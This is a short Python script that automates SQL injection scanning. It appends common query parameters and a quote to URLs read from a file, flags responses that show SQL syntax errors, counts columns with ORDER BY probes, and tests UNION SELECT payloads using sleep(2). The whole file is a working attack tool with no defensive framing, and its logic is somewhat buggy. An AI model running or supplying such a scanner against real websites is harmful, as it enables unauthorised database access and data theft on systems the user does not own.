import requests
import os
lyst=["?plot=","?id=","?cat=","?dir=","?action=","?board=","?date=","?detail=","?file=","?download=","?path=","?folder=","?prefix=","?include=","?page=","?inc=","?locate=","?show=","?doc=","?site="]
count = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20"]
i = "syntax"


"""creates new file using found files and  single quote"""
with open('files','r')as file, open('sql_test_params','a') as sql:
	for line in file:
		line = line.strip()
		for l in lyst:
			mline = line.rstrip() + l
			sql.write(mline +"'" + '\n')
file.close()
sql.close()

""" check for sql error in request text indicating possible sql injection """
with open('sql_test_params','r') as  sql:
	with open('injections','a')as injection:
		for urls in sql:
			urls = urls.strip()
			r = requests.get(urls)
			r = r.text
			if i in r:
				print('possible sql injection '+urls)
				injection.write(urls+'\n')
sql.close()
injection.close()
"""remove the single quote from the url found for later testing"""
with open('injections','r')as inj:
	data = inj.read()
	data = data.replace("'","")

with open('injection_urls','w')as inj:
	inj.write(data)
inj.close()

x = 0
"""now check for order by clause to get number of columns"""
with open('injection_urls','r')as inj:
	for urls in inj:
		urls = urls.strip()
		for x in (count):
			page = (urls+"1 ORDER BY "+x)
			r = requests.get(page)
			r = r.text
			if "Unknown column" in r:
				x = (int(x))
				x = (x-1)
				print(x," number of columns are usable")
				break
"""using the sleep command check for which column we can use"""
for i in range(1, x+1):
	values = ["1"]*x
	values[i-1] = "sleep(2)"
	query = urls + "1 UNION SELECT " + ",".join(values) + "--"
	r = requests.get(query)
	if r.status_code == 200:
		print("Column",(i + 1), "is injectable")
		break
	else:
		print("no columns are injectable")
		break

print("cleaning up files...")
os.remove('injection_urls')
os.remove('injections')
os.remove('sql_test_params')
print('good bye')
